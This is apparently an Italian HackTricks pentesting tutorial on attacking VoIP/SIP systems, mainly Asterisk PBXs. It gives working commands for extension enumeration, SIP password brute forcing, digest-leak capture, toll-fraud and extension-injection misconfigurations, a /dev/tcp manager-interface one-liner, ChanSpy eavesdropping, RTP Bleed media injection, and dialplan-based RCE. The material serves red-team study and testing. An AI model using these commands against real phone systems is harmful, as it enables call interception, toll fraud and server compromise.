# Test delle vulnerabilit√† VoIP

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Informazioni di base su VoIP

Per iniziare a conoscere come funziona VoIP, controlla:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Messaggi di base
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Codici di risposta

**1xx‚ÄîRisposte provvisorie**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîRisposte di successo**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîRisposte di reindirizzamento**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîRisposte di fallimento del client**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîRisposte di errore del server**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîRisposte di fallimento globale**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Enumerazione VoIP

### Numeri di telefono

Uno dei primi passi che un Red Team potrebbe compiere √® cercare i numeri di telefono disponibili per contattare l'azienda utilizzando strumenti OSINT, ricerche su Google o facendo scraping delle pagine web.

Una volta ottenuti i numeri di telefono, potresti utilizzare servizi online per identificare l'operatore:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Sapere se l'operatore fornisce servizi VoIP potrebbe aiutarti a identificare se l'azienda sta utilizzando VoIP... Inoltre, √® possibile che l'azienda non abbia assunto servizi VoIP ma stia utilizzando schede PSTN per collegare il proprio VoIP PBX alla rete telefonica tradizionale.

Cose come risposte automatizzate o musica di attesa di solito indicano l'uso di VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informazioni OSINT

Qualsiasi altra enumerazione OSINT che aiuti a identificare il software VoIP in uso sar√† utile per un Red Team.

### Enumerazione di Rete

* **`nmap`** √® in grado di eseguire la scansione dei servizi UDP, ma a causa del numero di servizi UDP sottoposti a scansione, risulta molto lento e potrebbe non essere molto accurato con questo tipo di servizi.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** da SIPVicious (`sudo apt install sipvicious`): Trover√† i servizi SIP nella rete indicata.
* `svmap` √® **facile da bloccare** perch√© utilizza l'User-Agent `friendly-scanner`, ma √® possibile modificare il codice da `/usr/share/sipvicious/sipvicious` e cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`Scansione SIPPTS`** da [**sippts**](https://github.com/Pepelux/sippts)**:** La scansione SIPPTS √® uno scanner molto veloce per i servizi SIP su UDP, TCP o TLS. Utilizza il multithreading e pu√≤ scansionare ampie gamme di reti. Consente di indicare facilmente un intervallo di porte, scansionare sia TCP che UDP, utilizzare un altro metodo (per impostazione predefinita utilizzer√† OPTIONS) e specificare un diverso User-Agent (e altro).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumerazione Extra della Rete

La PBX potrebbe anche esporre altri servizi di rete come:

- **69/UDP (TFTP)**: Aggiornamenti del firmware
- **80 (HTTP) / 443 (HTTPS)**: Per gestire il dispositivo dal web
- **389 (LDAP)**: Alternativa per memorizzare le informazioni degli utenti
- **3306 (MySQL)**: Database MySQL
- **5038 (Manager)**: Consente di utilizzare Asterisk da altre piattaforme
- **5222 (XMPP)**: Messaggi utilizzando Jabber
- **5432 (PostgreSQL)**: Database PostgreSQL
- E altri...

### Enumerazione dei Metodi

√à possibile trovare **quali metodi sono disponibili** per l'uso nella PBX utilizzando `SIPPTS enumerate` da [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analisi delle risposte del server

√à molto importante analizzare gli header che un server ci invia, a seconda del tipo di messaggio e degli header che inviamo. Con `SIPPTS send` da [**sippts**](https://github.com/Pepelux/sippts) possiamo inviare messaggi personalizzati, manipolando tutti gli header e analizzando la risposta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
√à anche possibile ottenere dati se il server utilizza i websockets. Con `SIPPTS wssend` da [**sippts**](https://github.com/Pepelux/sippts) possiamo inviare messaggi WS personalizzati.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumerazione delle estensioni

Le estensioni in un sistema PBX (Private Branch Exchange) si riferiscono agli **identificatori interni unici assegnati a singole** linee telefoniche, dispositivi o utenti all'interno di un'organizzazione o azienda. Le estensioni rendono possibile **instradare chiamate all'interno dell'organizzazione in modo efficiente**, senza la necessit√† di numeri di telefono esterni individuali per ogni utente o dispositivo.

* **`svwar`** da SIPVicious (`sudo apt install sipvicious`): `svwar` √® uno scanner di linee di estensione SIP PBX gratuito. In concetto funziona in modo simile ai tradizionali wardialer **indovinando un intervallo di estensioni o una lista data di estensioni**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica le estensioni su un server SIP. Sipexten pu√≤ controllare ampie reti di rete e porti.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: √à possibile anche enumerare estensioni/nomi utente con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** √® un enumeratore di forza bruta di nomi utente per il protocollo Inter Asterisk Exchange. enumIAX pu√≤ operare in due modalit√† distinte; Indovinamento sequenziale dei nomi utente o Attacco a dizionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attacchi VoIP

### Forza bruta della password - online

Avendo scoperto la **PBX** e alcuni **estensioni/nomi utente**, un Red Team potrebbe provare ad **autenticarsi tramite il metodo `REGISTER`** su un'estensione utilizzando un dizionario di password comuni per forzare l'autenticazione.

{% hint style="danger" %}
Nota che un **nome utente** pu√≤ essere lo stesso dell'estensione, ma questa pratica pu√≤ variare a seconda del sistema PBX, della sua configurazione e delle preferenze dell'organizzazione...

Se il nome utente non √® lo stesso dell'estensione, sar√† necessario **individuare il nome utente per forzare la password**.
{% endhint %}

* **`svcrack`** da SIPVicious (`sudo apt install sipvicious`): SVCrack ti consente di forzare la password per un nome utente/estensione specifico su una PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack √® un cracker di password remoto per servizi SIP. Rcrack pu√≤ testare le password per diversi utenti in diverse IP e intervalli di porte.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### Intercezione VoIP

Se trovi attrezzature VoIP all'interno di una **rete Wifi aperta**, potresti **intercettare tutte le informazioni**. Inoltre, se ti trovi all'interno di una rete pi√π chiusa (connessa tramite Ethernet o Wifi protetto) potresti eseguire **attacchi MitM come** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) tra il **PBX e il gateway** per intercettare le informazioni.

Tra le informazioni di rete, potresti trovare **credenziali web** per gestire l'attrezzatura, **estensioni utente**, **username**, **indirizzi IP**, persino **password hashate** e **pacchetti RTP** che potresti riprodurre per **ascoltare la conversazione**, e altro ancora.

Per ottenere queste informazioni potresti utilizzare strumenti come Wireshark, tcpdump... ma uno **strumento creato appositamente per intercettare conversazioni VoIP √®** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Nota che se viene utilizzato **TLS nella comunicazione SIP** non sarai in grado di vedere la comunicazione SIP in chiaro.\
Lo stesso accadr√† se viene utilizzato **SRTP** e **ZRTP**, i **pacchetti RTP non saranno in testo chiaro**.
{% endhint %}

#### Credenziali SIP (Brute-Force della password - offline)

[Controlla questo esempio per capire meglio una **comunicazione SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) per capire come vengono inviate le **credenziali**.

* **`sipdump`** & **`sipcrack`,** parte di **sipcrack** (`apt-get install sipcrack`): Questi strumenti possono **estrarre** da un **pcap** le **autenticazioni digest** all'interno del protocollo SIP e **eseguirne il brute force**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump pu√≤ estrarre autenticazioni digest da un file pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack √® uno strumento per crackare le autenticazioni digest ottenute con il dump di SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark estrae i dati del protocollo SIP da un file PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Codici DTMF

**Non solo le credenziali SIP** possono essere trovate nel traffico di rete, √® anche possibile trovare i codici DTMF che vengono utilizzati ad esempio per accedere alla **segreteria telefonica**.\
√à possibile inviare questi codici nei messaggi **INFO SIP**, in **audio** o all'interno dei **pacchetti RTP**. Se i codici sono all'interno dei pacchetti RTP, potresti tagliare quella parte della conversazione e utilizzare lo strumento multimo per estrarli:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chiamate gratuite / Configurazioni errate delle connessioni di Asterisk

In Asterisk √® possibile consentire una connessione **da un indirizzo IP specifico** o da **qualsiasi indirizzo IP**:
```
host=10.10.10.10
host=dynamic
```
Se viene specificato un indirizzo IP, l'host **non dovr√† inviare richieste di REGISTRAZIONE** di tanto in tanto (nel pacchetto di REGISTRAZIONE viene inviato il tempo di vita, di solito 30 minuti, il che significa che in un altro scenario il telefono dovr√† REGISTRARSI ogni 30 minuti). Tuttavia, sar√† necessario avere porte aperte che consentano connessioni dal server VoIP per ricevere chiamate.

Per definire gli utenti possono essere definiti come:

* **`type=user`**: L'utente pu√≤ solo ricevere chiamate come utente.
* **`type=friend`**: √à possibile effettuare chiamate come peer e riceverle come utente (usato con le estensioni)
* **`type=peer`**: √à possibile inviare e ricevere chiamate come peer (trunk SIP)

√à anche possibile stabilire la fiducia con la variabile non sicura:

* **`insecure=port`**: Consente connessioni peer validate dall'IP.
* **`insecure=invite`**: Non richiede autenticazione per i messaggi INVITE
* **`insecure=port,invite`**: Entrambi

{% hint style="warning" %}
Quando viene utilizzato **`type=friend`**, il **valore** della variabile **host** **non verr√† utilizzato**, quindi se un amministratore **configura erroneamente un trunk SIP** utilizzando quel valore, **chiunque potr√† connettersi ad esso**.

Ad esempio, questa configurazione sarebbe vulnerabile:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Chiamate Gratuite / Configurazioni Errate del Contesto di Asterisk

In Asterisk un **contesto** √® un contenitore o sezione denominato nel piano di chiamata che **raggruppa estensioni, azioni e regole correlate**. Il piano di chiamata √® il componente principale di un sistema Asterisk, poich√© definisce **come vengono gestite e instradate le chiamate in entrata e in uscita**. I contesti vengono utilizzati per organizzare il piano di chiamata, gestire il controllo degli accessi e fornire separazione tra diverse parti del sistema.

Ogni contesto √® definito nel file di configurazione, tipicamente nel file **`extensions.conf`**. I contesti sono indicati da parentesi quadre, con il nome del contesto racchiuso al loro interno. Ad esempio:
```bash
csharpCopy code[my_context]
```
All'interno del contesto, si definiscono le estensioni (pattern di numeri chiamati) e le si associamo a una serie di azioni o applicazioni. Queste azioni determinano come la chiamata viene elaborata. Ad esempio:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Questo esempio dimostra un semplice contesto chiamato "my\_context" con un'estensione "100". Quando qualcuno compone 100, la chiamata verr√† risposta, verr√† riprodotto un messaggio di benvenuto e poi la chiamata verr√† terminata.

Questo √® **un altro contesto** che permette di **chiamare qualsiasi altro numero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se l'amministratore definisce il **contesto predefinito** come:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Chiunque potr√† utilizzare il **server per chiamare qualsiasi altro numero** (e l'amministratore del server pagher√† la chiamata).
{% endhint %}

{% hint style="danger" %}
Inoltre, per impostazione predefinita il file **`sip.conf`** contiene **`allowguest=true`**, quindi **qualsiasi** attaccante **senza autenticazione** potr√† chiamare qualsiasi altro numero.
{% endhint %}

*   **`SIPPTS invite`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite controlla se un **server PBX ci consente di effettuare chiamate senza autenticazione**. Se il server SIP ha una configurazione errata, ci permetter√† di effettuare chiamate a numeri esterni. Pu√≤ anche consentirci di trasferire la chiamata a un secondo numero esterno.

Ad esempio, se il tuo server Asterisk ha una cattiva configurazione del contesto, potresti accettare la richiesta INVITE senza autorizzazione. In questo caso, un attaccante potrebbe effettuare chiamate senza conoscere alcun utente/password.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Chiamate gratuite / IVRS non configurato correttamente

IVRS sta per **Interactive Voice Response System**, una tecnologia telefonica che consente agli utenti di interagire con un sistema computerizzato tramite comandi vocali o tastiera. IVRS viene utilizzato per creare sistemi di gestione delle chiamate automatizzati che offrono una serie di funzionalit√†, come fornire informazioni, instradare chiamate e acquisire input degli utenti.

IVRS nei sistemi VoIP di solito consiste in:

1. **Promemoria vocali**: Messaggi audio preregistrati che guidano gli utenti attraverso le opzioni e le istruzioni del menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) signaling: Input a toni multipli generati premendo i tasti sul telefono, che vengono utilizzati per navigare attraverso i menu IVR e fornire input.
3. **Instradamento delle chiamate**: Indirizzare le chiamate alla destinazione appropriata, come dipartimenti specifici, agenti o estensioni in base all'input dell'utente.
4. **Acquisizione di input utente**: Raccogliere informazioni dagli chiamanti, come numeri di conto, ID caso o altri dati rilevanti.
5. **Integrazione con sistemi esterni**: Collegare il sistema IVR a database o altri sistemi software per accedere o aggiornare informazioni, eseguire azioni o attivare eventi.

In un sistema VoIP Asterisk, √® possibile creare un IVR utilizzando il piano di chiamata (file **`extensions.conf`**) e varie applicazioni come `Background()`, `Playback()`, `Read()`, e altro ancora. Queste applicazioni ti aiutano a riprodurre promemoria vocali, acquisire input utente e controllare il flusso della chiamata.

#### Esempio di configurazione vulnerabile
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Il precedente √® un esempio in cui all'utente viene chiesto di **premere 1 per chiamare** un dipartimento, **2 per chiamare** un altro, o **inserire l'estensione completa** se la conosce.\
La vulnerabilit√† risiede nel fatto che la **lunghezza dell'estensione indicata non viene verificata, quindi un utente potrebbe inserire un numero completo durante il timeout di 5 secondi e verr√† chiamato.**

### Iniezione di Estensione

Utilizzando un'estensione come:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Dove **`${EXTEN}`** √® l'**estensione** che verr√† chiamata, quando viene inserita l'**ext 101** questo √® ci√≤ che accadrebbe:
```scss
exten => 101,1,Dial(SIP/101)
```
Tuttavia, se **`${EXTEN}`** consente di inserire **pi√π di numeri** (come nelle versioni precedenti di Asterisk), un attaccante potrebbe inserire **`101&SIP123123123`** per chiamare il numero di telefono 123123123. E questo sarebbe il risultato:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Pertanto, una chiamata all'estensione **`101`** e **`123123123`** verr√† inviata e solo la prima che risponde alla chiamata verr√† stabilita... ma se un attaccante utilizza un'**estensione che aggira qualsiasi corrispondenza** che viene eseguita ma non esiste, potrebbe **iniettare una chiamata solo al numero desiderato**.

## Vulnerabilit√† SIPDigestLeak

Il SIP Digest Leak √® una vulnerabilit√† che colpisce un gran numero di telefoni SIP, inclusi sia telefoni IP hardware che software, nonch√© adattatori telefonici (VoIP ad analogico). La vulnerabilit√† consente il **lecchino della risposta di autenticazione Digest**, che viene calcolata dalla password. √à quindi possibile un **attacco offline alla password** e pu√≤ recuperare la maggior parte delle password basate sulla risposta alla sfida.

**[Scenario di vulnerabilit√† da qui**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un telefono IP (vittima) √® in ascolto su qualsiasi porta (ad esempio: 5060), accettando chiamate telefoniche
2. L'attaccante invia un INVITE al telefono IP
3. Il telefono della vittima inizia a squillare e qualcuno risponde e riaggancia (perch√© nessuno risponde al telefono dall'altro capo)
4. Quando il telefono viene riagganciato, il **telefono della vittima invia un BYE all'attaccante**
5. L'**attaccante emette una risposta 407** che **richiede l'autenticazione** ed emette una sfida di autenticazione
6. Il **telefono della vittima fornisce una risposta alla sfida di autenticazione** in un secondo BYE
7. L'**attaccante pu√≤ quindi eseguire un attacco di forza bruta** sulla risposta alla sfida sul suo computer locale (o rete distribuita, ecc.) e indovinare la password

* **SIPPTS leak** da [**sippts**](https://github.com/Pepelux/sippts)**:** Il leak di SIPPTS sfrutta la vulnerabilit√† di SIP Digest Leak che colpisce un gran numero di telefoni SIP. L'output pu√≤ essere salvato in formato SipCrack per forzarlo utilizzando SIPPTS dcrack o lo strumento SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call consente a un **utente web** (che ad esempio potrebbe essere interessato a un prodotto) di **inserire** il suo **numero di telefono** per essere chiamato. Successivamente verr√† chiamato un operatore commerciale e quando **risponder√† al telefono**, l'utente verr√† **chiamato e connesso con l'agente**.

Un profilo Asterisk comune per questo √®:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Il profilo precedente sta permettendo a **QUALSIASI indirizzo IP di connettersi** (se la password √® nota).
* Per **organizzare una chiamata**, come specificato in precedenza, **non √® necessaria alcuna autorizzazione di lettura** e √® necessario solo **originate** in **write**.

Con tali autorizzazioni, qualsiasi IP che conosce la password potrebbe connettersi ed estrarre troppe informazioni, come:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Ulteriori informazioni o azioni potrebbero essere richieste.**

### **Ascolto clandestino**

In Asterisk √® possibile utilizzare il comando **`ChanSpy`** indicando le **estensioni da monitorare** (o tutte) per ascoltare le conversazioni in corso. Questo comando deve essere assegnato a un'estensione.

Ad esempio, **`exten => 333,1,ChanSpy('all',qb)`** indica che se **chiama** l'**estensione 333**, verranno **monitorate** **`tutte`** le estensioni, **inizia ad ascoltare** ogni volta che inizia una nuova conversazione (**`b`**) in modalit√† silenziosa (**`q`**) poich√© non vogliamo interagire. √à possibile passare da una conversazione all'altra premendo **`*`**, o selezionando il numero dell'estensione.

√à anche possibile utilizzare **`ExtenSpy`** per monitorare una sola estensione.

Invece di ascoltare le conversazioni, √® possibile **registrare** in file utilizzando un'estensione come:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Le chiamate verranno salvate in **`/tmp`**.

Potresti anche far eseguire ad Asterisk uno **script che far√† trapelare la chiamata** quando viene chiusa.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilit√† RTCPBleed

**RTCPBleed** √® un grave problema di sicurezza che colpisce i server VoIP basati su Asterisk (pubblicato nel 2017). La vulnerabilit√† consente al traffico **RTP (Real Time Protocol)**, che trasporta le conversazioni VoIP, di essere **intercettato e reindirizzato da chiunque su Internet**. Ci√≤ avviene perch√© il traffico RTP bypassa l'autenticazione durante la navigazione attraverso i firewall NAT (Network Address Translation).

I proxy RTP cercano di affrontare le **limitazioni NAT** che influenzano i sistemi RTC proxyando i flussi RTP tra due o pi√π parti. Quando √® presente un NAT, il software del proxy RTP spesso non pu√≤ fare affidamento sulle informazioni IP e di porta RTP recuperate attraverso la segnalazione (ad esempio SIP). Pertanto, diversi proxy RTP hanno implementato un meccanismo in cui tale **coppia IP e porta viene appresa automaticamente**. Questo avviene spesso ispezionando il traffico RTP in ingresso e contrassegnando l'IP e la porta di origine per qualsiasi traffico RTP in ingresso come quello a cui dovrebbe essere risposto. Questo meccanismo, che pu√≤ essere chiamato "modalit√† di apprendimento", **non fa uso di alcun tipo di autenticazione**. Pertanto, gli **attaccanti** possono **inviare traffico RTP al proxy RTP** e ricevere il traffico RTP proxy destinato al chiamante o al chiamato di uno stream RTP in corso. Chiamiamo questa vulnerabilit√† RTP Bleed perch√© consente agli attaccanti di ricevere flussi multimediali RTP destinati a utenti legittimi.

Un altro comportamento interessante dei proxy RTP e degli stack RTP √® che a volte, **anche se non sono vulnerabili a RTP Bleed**, accetteranno, inoltreranno e/o elaboreranno pacchetti RTP da qualsiasi origine. Pertanto, gli attaccanti possono inviare pacchetti RTP che potrebbero consentire loro di iniettare i propri media invece di quelli legittimi. Chiamiamo questo attacco iniezione RTP perch√© consente l'iniezione di pacchetti RTP non legittimi nei flussi RTP esistenti. Questa vulnerabilit√† pu√≤ essere riscontrata sia nei proxy RTP che negli endpoint.

Asterisk e FreePBX hanno tradizionalmente utilizzato l'impostazione **`NAT=yes`**, che consente al traffico RTP di bypassare l'autenticazione, portando potenzialmente a nessun audio o audio unidirezionale nelle chiamate.

Per ulteriori informazioni consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed rileva la vulnerabilit√† RTP Bleed inviando flussi RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed rileva la vulnerabilit√† RTP Bleed inviando flussi RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood sfrutta la vulnerabilit√† RTP Bleed inviando flussi RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** da [**sippts**](https://github.com/Pepelux/sippts)**:** L'exploit SIPPTS rtpbleedinject sfrutta la vulnerabilit√† RTP Bleed iniettando un file audio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk riesci in qualche modo a **aggiungere regole di estensione e ricaricarle** (ad esempio compromettendo un server di gestione web vulnerabile), √® possibile ottenere RCE utilizzando il comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Esiste un comando chiamato **`Shell`** che potrebbe essere utilizzato **al posto di `System`** per eseguire comandi di sistema se necessario.

{% hint style="warning" %}
Se il server **vieta l'uso di certi caratteri** nel comando **`System`** (come in Elastix), controlla se il server web permette di **creare file all'interno del sistema** (come in Elastix o trixbox), e usalo per **creare uno script backdoor** e poi utilizza **`System`** per **eseguire** tale **script**.
{% endhint %}

#### File locali interessanti e permessi

* **`sip.conf`** -> Contiene la password degli utenti SIP.
